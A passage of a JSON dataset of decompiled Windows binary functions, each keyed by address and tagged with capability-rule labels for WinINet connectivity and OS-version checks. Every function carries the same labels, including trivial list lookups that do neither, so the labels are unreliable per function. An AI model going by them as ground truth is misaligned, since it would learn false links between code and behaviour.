(**0x800510c8)();\n        if (cVar1 == '\\0') {\n            var_3ch = *var_ch;\n        }\n        else {\n            var_4h = 0;\n            (**0x800512dc)(var_ch, 4, 1);\n            var_3ch = *var_ch;\n            var_4h = 0xffffffff;\n        }\n        iVar3 = fcn.00034f60(var_3ch, &var_38h);\n        if (iVar3 == 0) {\n            iVar3 = fcn.00078a50(var_38h, 0, &var_30h_2, 0x18, 0);\n            if (iVar3 == 0) {\n                fcn.0001fe20(var_1ch_2, var_20h_2, 1);\n            }\n            fcn.00034fb0(var_3ch, var_38h);\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_34h;\n}\n",
        "token_count": 703
    },
    "0001fcd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0001fcd0(uint arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint *var_25h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_25h._0_1_ = '\\0';\n    arg_ch_00 = &var_2ch;\n    iVar1 = fcn.0005a170(0xffffffff, arg_ch_00);\n    if (iVar1 == 0) {\n        var_1ch = *(var_2ch + 0x1c);\n        if (*(var_1ch + 4) < 0x80000000) {\n            if ((*0x800ce67c == NULL) || (*0x800ce680 == NULL)) {\n                iVar1 = fcn.00034f40(0x80051918, &var_20h);\n                if (iVar1 != 0) {\n                    return 0xc0000005;\n                }\n                iVar1 = fcn.0005cd70(var_20h, 0x800519e4, 0x800ce67c);\n                if (iVar1 != 0) {\n                    return 0xc0000005;\n                }\n                iVar1 = fcn.0005cd70(var_20h, 0x800519fc, 0x800ce680);\n                if (iVar1 != 0) {\n                    return 0xc0000005;\n                }\n            }\n            (**0x800ce680)(*(var_2ch + 0x1c));\n            var_25h._0_1_ = '\\x01';\n        }\n        if (arg_ch == NULL) {\n            var_34h = 0xffffffff;\n        }\n        else {\n            var_34h = arg_ch;\n        }\n        arg_8h_00 = var_34h;\n        puVar4 = var_34h;\n        iVar1 = fcn.00034f60(var_34h, &var_25h + 1);\n        if (iVar1 == 0) {\n            var_34h = stack0xffffffd8;\n            iVar1 = fcn.00078a50();\n            if (iVar1 == 0) {\n                var_34h = var_4h;\n                fcn.0001fe20(var_4h, var_8h, 0);\n            }\n            fcn.00034fb0(arg_8h_00, stack0xffffffd8);\n            puVar4 = arg_8h_00;\n            arg_ch_00 = stack0xffffffc4;\n        }\n        if (var_25h != '\\0') {\n            (**0x800ce67c)(*(var_2ch + 0x1c), puVar4, arg_ch_00, var_34h);\n        }\n    }\n    pcVar2 = fcn.00063f30(arg_8h);\n    uVar3 = (*pcVar2)(arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 815
    },
    "0001fe20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001fe20(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_114h;\n    uint var_110h;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00035150();\n    fcn.00036d60(arg_ch, &var_110h, 0x104);\n    if (arg_10h == '\\0') {\n        if ((0x1a < iVar1) && (iVar1 = fcn.00078a92(&var_110h, 0x80051a14),  iVar1 == 0)) {\n            fcn.00044070(arg_ch);\n        }\n        fcn.00037640(0x800ce5f4, &var_4h, 1);\n        if (*0x800ce600 != 0) {\n            for (var_8h = 0; (var_8h < *0x800ce600 && (*(*0x800ce604 + var_8h * 8) != arg_ch)); var_8h = var_8h + 1) {\n            }\n            for (; var_8h < *0x800ce600 - 1; var_8h = var_8h + 1) {\n                fcn.000789fc(*0x800ce604 + var_8h * 8, *0x800ce604 + 8 + var_8h * 8, 8);\n            }\n            if (var_8h < *0x800ce600) {\n                *0x800ce600 = *0x800ce600 - 1;\n                fcn.00035720(0x800ce604, *0x800ce600 * 8 + 8, *0x800ce600 * 8);\n            }\n        }\n        fcn.00037670(0x800ce5f4, &var_4h, 1);\n        fcn.00019950(&var_110h, arg_ch);\n        fcn.000200b0(arg_ch, 0);\n    }\n    else {\n        for (var_8h = 0; var_8h < *0x800ce668; var_8h = var_8h + 1) {\n            if (*(*0x800ce66c + var_8h * 8) == arg_8h) {\n                fcn.0001ffe0(arg_ch, 0);\n            }\n        }\n        if ((0x1a < iVar1) && (iVar1 = fcn.00078a92(&var_110h, 0x80051a14),  iVar1 == 0)) {\n            fcn.00043de0(arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 627
    },
    "000201d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000201d0(uint arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint var_28h;\n    int32_t var_21h;\n    uint var_1ch;\n    uint *var_18h;\n    char var_11h;\n    uint var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    var_28h = 0;\n    var_1ch = 0;\n    var_10h = 0;\n    var_21h._0_1_ = '\\0';\n    var_9h._0_1_ = '\\0';\n    var_11h = '\\0';\n    if (*0x800ce644 == NULL) {\n        return 0x21590001;\n    }\n    var_18h = arg_ch;\n    var_4h = arg_18h;\n    stack0xfffffff4 = arg_10h;\n    cVar1 = (**0x800510c8)();\n    if (cVar1 == '\\x01') {\n        *NULL = fcn.0001b150(&var_18h, 4, 1, 2, &var_28h);\n        if (*NULL != 0) goto code_r0x000202bf;\n        var_21h._0_1_ = '\\x01';\n        *NULL = fcn.0001b150(&var_4h, 4, 1, 2, &var_1ch);\n        if (*NULL != 0) goto code_r0x000202bf;\n        var_9h._0_1_ = '\\x01';\n        *NULL = fcn.0001b150(&var_9h + 1, 4, 1, 2, &var_10h);\n        if (*NULL != 0) goto code_r0x000202bf;\n        var_11h = '\\x01';\n    }\n    *NULL = (**0x800ce644)(arg_8h, var_18h, stack0xfffffff4, arg_14h, var_4h);\n    if (*NULL == 0) {\n        *arg_ch = *var_18h;\n    }\ncode_r0x000202bf:\n    if (var_11h != '\\0') {\n        fcn.0001b1e0(stack0xfffffff4, var_10h);\n    }\n    if (var_9h != '\\0') {\n        fcn.0001b1e0(var_4h, var_1ch);\n    }\n    if (var_21h != '\\0') {\n        fcn.0001b1e0(var_18h, var_28h);\n    }\n    return *NULL;\n}\n",
        "token_count": 631
    },
    "00020310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00020310(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0x800ce648 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        uVar3 = (**0x800ce648)(arg_8h, arg_ch);\n        uVar2 = uVar3;\n        fcn.0001baf0(uVar3 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "00020360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_2eh\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00020360(uint *arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h, uint *arg_18h, uint arg_1ch, uint arg_20h, \n            uint32_t arg_24h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t uVar3;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar auStack52 [2];\n    uint *var_2eh;\n    int32_t var_25h;\n    uint var_20h;\n    uint *var_1ch;\n    uchar auStack28 [3];\n    uint var_15h;\n    uint var_10h;\n    uchar auStack16 [3];\n    uint var_9h;\n    uint *var_4h;\n    \n    var_38h = 0;\n    var_20h = 0;\n    var_10h = 0;\n    var_4h = NULL;\n    var_34h = 0;\n    _auStack16 = auStack16;\n    _auStack28 = auStack28;\n    _auStack52 = auStack52;\n    var_25h._0_1_ = '\\0';\n    if (*0x800ce650 == NULL) {\n        return 0x21590001;\n    }\n    var_3ch = arg_8h;\n    var_1ch = arg_18h;\n    stack0xffffffe8 = arg_1ch;\n    stack0xfffffff4 = arg_20h;\n    stack0xffffffd0 = arg_10h;\n    cVar2 = (**0x800510c8)();\n    uVar3 = extraout_ECX;\n    if (cVar2 == '\\x01') {\n        *NULL = fcn.0001b150(&fcn.00020360::var_3ch, 4, 1, 2, &fcn.00020360::var_38h);\n        if (*NULL != 0) goto code_r0x000204f3;\n        _auStack52 = CONCAT12(1, auStack52);\n        _auStack52 = _auStack52 & 0xff000000 | _auStack52;\n        if ((arg_18h != NULL) &&\n           (*NULL = fcn.0001b150(&fcn.00020360::var_1ch, 8, 1, 2, &fcn.00020360::var_20h),  *NULL != 0))\n        goto code_r0x000204f3;\n        var_4h = &fcn.00020360::var_10h;\n        stack0xfffffff4 = 0;\n        _auStack16 = 1;\n        var_10h = 0x2cc;\n        var_3ch = &fcn.00020360::var_15h + 1;\n        _auStack28 = 0x20446;\n        *NULL = fcn.0001b150(var_3ch, 0x2cc, 1, 0, var_4h);\n        if (*NULL != 0) goto code_r0x000204f3;\n        _auStack28 = &fcn.00020360::var_4h;\n        var_1ch = NULL;\n        var_20h = 1;\n        stack0xffffffd8 = 0x14;\n        var_3ch = &fcn.00020360::var_9h + 1;\n        stack0xffffffd0 = 0x2046b;\n        *NULL = fcn.0001b150(var_3ch, 0x14, 1, 0, _auStack28);\n        if (*NULL != 0) goto code_r0x000204f3;\n        _auStack52 = CONCAT13(1, _auStack52);\n        uVar3 = extraout_ECX_00;\n        if (arg_10h != NULL) {\n            unique0x00001d00 = &fcn.00020360::var_34h;\n            _auStack52 = 2;\n            var_34h = 1;\n            var_38h = 0x18;\n            var_3ch = &fcn.00020360::var_2eh + 2;\n            *NULL = fcn.0001b150(var_3ch, 0x18, 1, 2, unique0x00001d00);\n            if (*NULL != 0) goto code_r0x000204f3;\n            var_25h._0_1_ = '\\x01';\n            uVar3 = extraout_ECX_01;\n        }\n    }\n    *NULL = (**0x800ce650)(var_3ch, arg_ch, stack0xffffffd0, arg_14h, var_1ch, stack0xffffffe8, stack0xfffffff4, \n                           uVar3 & 0xffffff00 | arg_24h & 0xff);\n    if ((*NULL == 0) && (*arg_8h = *var_3ch,  arg_18h != NULL)) {\n        uVar1 = var_1ch[1];\n        *arg_18h = *var_1ch;\n        arg_18h[1] = uVar1;\n    }\ncode_r0x000204f3:\n    if (var_25h != '\\0') {\n        fcn.0001b1e0(stack0xffffffd0, var_34h);\n    }\n    if (var_2eh._1_1_ != '\\0') {\n        fcn.0001b1e0(stack0xfffffff4, var_4h);\n    }\n    if (var_15h != '\\0') {\n        fcn.0001b1e0(stack0xffffffe8, var_10h);\n    }\n    if (var_9h != '\\0') {\n        fcn.0001b1e0(var_1ch, var_20h);\n    }\n    if (var_2eh != '\\0') {\n        fcn.0001b1e0(var_3ch, var_38h);\n    }\n    return *NULL;\n}\n",
        "token_count": 1464
    },
    "00020570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00020570(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0x800ce64c == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        uVar3 = (**0x800ce64c)(arg_8h, arg_ch);\n        uVar2 = uVar3;\n        fcn.0001baf0(uVar3 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 184
    },
    "000205c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.000205c0(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0x800ce638 == NULL) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar2 = fcn.0001baf0(0);\n        uVar1 = (**0x800ce638)(arg_8h, arg_ch, arg_10h, uVar2 & 0xffffff00 | arg_14h & 0xff);\n        fcn.0001baf0(extraout_ECX & 0xffffff00 | uVar2 & 0xff);\n    }\n    return uVar1;\n}\n",
        "token_count": 214
    },
    "00020610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00020610(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0x800ce63c == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        uVar2 = (**0x800ce63c)(arg_8h, arg_ch, arg_10h);\n        fcn.0001baf0(uVar2 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 179
    },
    "00020660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00020660(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0x800ce640 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        uVar3 = (**0x800ce640)(arg_8h, arg_ch);\n        uVar2 = uVar3;\n        fcn.0001baf0(uVar3 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "000206b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.000206b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0x800ce658 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        uVar3 = (**0x800ce658)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        uVar2 = uVar3;\n        fcn.0001baf0(uVar3 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 216
    },
    "00020720": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00020720(uint32_t *arg_8h, uint32_t arg_ch, char *arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t var_98h;\n    uint32_t var_94h;\n    uint var_90h;\n    uint var_4h;\n    \n    if (arg_ch < 8) {\n        var_98h = 0;\n        var_94h = 0;\n        fcn.00078be8(&var_98h, arg_8h, arg_ch);\n    }\n    else {\n        var_98h = *arg_8h;\n        var_94h = arg_8h[1];\n    }\n    var_98h = var_98h ^ arg_18h;\n    if (arg_18h != 0) {\n        fcn.000317c0(&var_90h, arg_ch, arg_8h);\n        fcn.00030ca0(arg_14h, arg_10h + 1, arg_18h, &var_90h, &var_98h, 1);\n    }\n    iVar1 = (-(arg_18h % 8 != 0) & 8) + (arg_18h & 0xfffffff8);\n    *arg_10h = iVar1 - arg_18h;\n    return iVar1 + 1;\n}\n",
        "token_count": 322
    },
    "000207f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.000207f0(uint noname_0, uint noname_1, uint8_t *arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint var_1h;\n    \n    if (arg_14h == 0) {\n        iVar2 = -1;\n    }\n    else {\n        uVar1 = *arg_10h;\n        if (uVar1 < 8) {\n            if (arg_14h - 1U < uVar1) {\n                iVar2 = -1;\n            }\n            else {\n                iVar2 = (arg_14h + -1) - uVar1;\n            }\n        }\n        else {\n            iVar2 = -1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 199
    },
    "00020840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00020840(uint32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint8_t *arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_ch_00;\n    uint var_a0h;\n    uint32_t var_9ch;\n    uint32_t var_98h;\n    uint var_91h;\n    uint32_t var_4h;\n    \n    if (arg_ch < 8) {\n        var_9ch = 0;\n        var_98h = 0;\n        fcn.00078be8(&var_9ch, arg_8h, arg_ch);\n    }\n    else {\n        var_9ch = *arg_8h;\n        var_98h = arg_8h[1];\n    }\n    var_91h._0_1_ = *arg_14h;\n    var_4h = (arg_18h + -1) - var_91h;\n    var_9ch = var_9ch ^ var_4h;\n    if (var_4h != 0) {\n        fcn.000317c0(&var_91h + 1, arg_ch, arg_8h);\n        if (var_91h == 0) {\n            fcn.00030ca0(arg_14h + 1, arg_10h, arg_18h + -1, &var_91h + 1, &var_9ch, 0);\n        }\n        else {\n            arg_ch_00 = fcn.000356c0(arg_18h + -1);\n            if (arg_ch_00 == 0) {\n                var_4h = 0xffffffff;\n            }\n            else {\n                fcn.00030ca0(arg_14h + 1, arg_ch_00, arg_18h + -1, &var_91h + 1, &var_9ch, 0);\n                fcn.00078be8(arg_10h, arg_ch_00, var_4h);\n                fcn.000357f0(arg_ch_00);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 494
    },
    "00020a10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020a10(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    while( true ) {\n        if (var_4h == NULL) {\n            return 0;\n        }\n        if (var_4h[1] == arg_ch) break;\n        var_4h = *var_4h;\n    }\n    if (var_4h[2] != arg_10h) {\n        return 0;\n    }\n    *arg_14h = var_4h[4];\n    if (arg_18h != NULL) {\n        *arg_18h = var_4h[3];\n    }\n    return 1;\n}\n",
        "token_count": 192
    },
    "00020a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020a80(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    while( true ) {\n        if (var_4h == NULL) {\n            return 0;\n        }\n        if (var_4h[1] == arg_ch) break;\n        var_4h = *var_4h;\n    }\n    if ((var_4h[2] == arg_10h) && (var_4h[3] == arg_18h)) {\n        fcn.00078be8(arg_14h, var_4h[4], var_4h[3]);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 193
    },
    "00020ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020ba0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_238h;\n    uint var_234h;\n    uint *var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_214h;\n    uint var_210h;\n    uint var_208h;\n    \n    fcn.00036890(&var_208h, 0x104, arg_8h);\n    fcn.000789c0(&var_21ch, &var_208h);\n    var_238h = 0x18;\n    var_234h = 0;\n    var_22ch = 0x40;\n    var_230h = &var_21ch;\n    var_228h = 0;\n    var_224h = 0;\n    iVar1 = fcn.0001f080(&var_214h, 0xc0100000, &var_238h, &var_210h, 0, 0, 3, (arg_ch != 0) + 1, 0x812, 0, 0);\n    if (iVar1 != 0) {\n        var_214h = 0;\n    }\n    return var_214h;\n}\n",
        "token_count": 310
    },
    "00020c80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020c80(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_10h = arg_ch;\n    var_ch = 0;\n    iVar1 = fcn.000789cc(arg_8h, &var_8h, &var_10h, 8, 0x14);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 154
    },
    "00020cc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020cc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_8h;\n    \n    iVar1 = fcn.00078a38(arg_8h, &var_8h, &var_20h, 0x18, 5);\n    if (iVar1 != 0) {\n        var_18h = 0xffffffff;\n    }\n    return var_18h;\n}\n",
        "token_count": 120
    },
    "00020d00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020d00(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = arg_8h;\n    var_18h = arg_14h;\n    var_14h = 0;\n    iVar1 = fcn.00078a56(arg_8h, 0, 0, 0, &var_8h, arg_ch, arg_10h, &var_18h, 0);\n    if (iVar1 == 0) {\n        if (var_4h == arg_10h) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 240
    },
    "00020d60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020d60(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = arg_8h;\n    var_18h = arg_14h;\n    var_14h = 0;\n    iVar1 = fcn.000789e4(arg_8h, 0, 0, 0, &var_8h, arg_ch, arg_10h, &var_18h, 0);\n    if (iVar1 == 0) {\n        if (var_4h == arg_10h) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 240
    },
    "00020de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14ch\n// WARNING: Variable defined which should be unmapped: var_148h\n\nint32_t __cdecl fcn.00020de0(uint8_t *arg_8h, int32_t arg_ch, uint32_t *arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    uint8_t *arg_8h_00;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    uint var_14ch;\n    int32_t var_148h;\n    uint8_t *var_140h;\n    uint8_t *var_13ch;\n    uint var_134h;\n    uint8_t *var_130h;\n    uint8_t *var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint *var_120h;\n    uint var_11ch;\n    uint32_t var_118h;\n    uint var_114h;\n    uint var_110h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    bVar2 = false;\n    var_4h = 0;\n    bVar3 = false;\n    var_120h = NULL;\n    if ((arg_8h == NULL) || (arg_10h == NULL)) {\n        return -1;\n    }\n    if (*0x800db9e4 == 0) {\n        fcn.00078bfa(0x800db9e0, 0, 0x30);\n        fcn.000349b0(0x800db9e0);\n        *0x800db9e4 = 1;\n    }\n    arg_8h_00 = fcn.000356c0(0x104);\n    if (arg_8h_00 == NULL) {\n        return 2;\n    }\n    var_12ch = arg_8h;\n    var_130h = arg_8h_00;\n    do {\n        uVar1 = *var_12ch;\n        *var_130h = uVar1;\n        var_12ch = 